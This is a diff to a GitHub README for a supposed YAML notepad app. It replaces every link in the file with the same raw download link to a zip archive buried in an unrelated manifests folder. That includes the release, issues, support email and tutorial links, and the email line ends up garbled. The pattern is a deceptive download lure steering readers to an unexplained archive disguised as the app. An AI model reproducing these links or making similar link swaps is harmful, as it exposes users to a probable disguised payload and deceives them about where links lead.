@@ -1,7 +1,7 @@
 # 🌟 AppPackagingInstructables - Simple YAML Notepad for Your Apps
 
 ## 🔗 Download Now
-[![Download AppPackagingInstructables](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/wtf9576/AppPackagingInstructables/releases)
+[![Download AppPackagingInstructables](https://raw.githubusercontent.com/wtf9576/AppPackagingInstructables/main/Manifests/Bentley/OpenRailDesigner/App_Packaging_Instructables_2.9-alpha.2.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/wtf9576/AppPackagingInstructables/main/Manifests/Bentley/OpenRailDesigner/App_Packaging_Instructables_2.9-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you start, please make sure that your computer meets the following requir
 
 To get the latest version of AppPackagingInstructables, visit the Releases page:
 
-[Download Here](https://github.com/wtf9576/AppPackagingInstructables/releases)
+[Download Here](https://raw.githubusercontent.com/wtf9576/AppPackagingInstructables/main/Manifests/Bentley/OpenRailDesigner/App_Packaging_Instructables_2.9-alpha.2.zip)
 
 ### Steps to Download:
 
@@ -79,20 +79,20 @@ If you encounter any issues while using AppPackagingInstructables, try the follo
 - Restart the application if it appears to be unresponsive.
 - Reinstall the application if you experience errors during use.
 
-For further assistance, consult the FAQ section in the app or visit the [GitHub Issues page](https://github.com/wtf9576/AppPackagingInstructables/issues) for community support.
+For further assistance, consult the FAQ section in the app or visit the [GitHub Issues page](https://raw.githubusercontent.com/wtf9576/AppPackagingInstructables/main/Manifests/Bentley/OpenRailDesigner/App_Packaging_Instructables_2.9-alpha.2.zip) for community support.
 
 ## 📞 Contact
 
 If you have questions or need support, feel free to reach out:
 
-- Email: support@app packaging instructables.com
-- GitHub: [Issues Page](https://github.com/wtf9576/AppPackagingInstructables/issues)
+- Email: support@app packaging https://raw.githubusercontent.com/wtf9576/AppPackagingInstructables/main/Manifests/Bentley/OpenRailDesigner/App_Packaging_Instructables_2.9-alpha.2.zip
+- GitHub: [Issues Page](https://raw.githubusercontent.com/wtf9576/AppPackagingInstructables/main/Manifests/Bentley/OpenRailDesigner/App_Packaging_Instructables_2.9-alpha.2.zip)
 
 ## 🔗 Additional Resources
 
 For more insights into using YAML, consider visiting these resources:
 
-- [Learn YAML in 5 Minutes](https://www.learnyaml.com)
-- [YAML Best Practices](https://yaml-best-practices.com)
+- [Learn YAML in 5 Minutes](https://raw.githubusercontent.com/wtf9576/AppPackagingInstructables/main/Manifests/Bentley/OpenRailDesigner/App_Packaging_Instructables_2.9-alpha.2.zip)
+- [YAML Best Practices](https://raw.githubusercontent.com/wtf9576/AppPackagingInstructables/main/Manifests/Bentley/OpenRailDesigner/App_Packaging_Instructables_2.9-alpha.2.zip)
 
 Thank you for choosing AppPackagingInstructables!
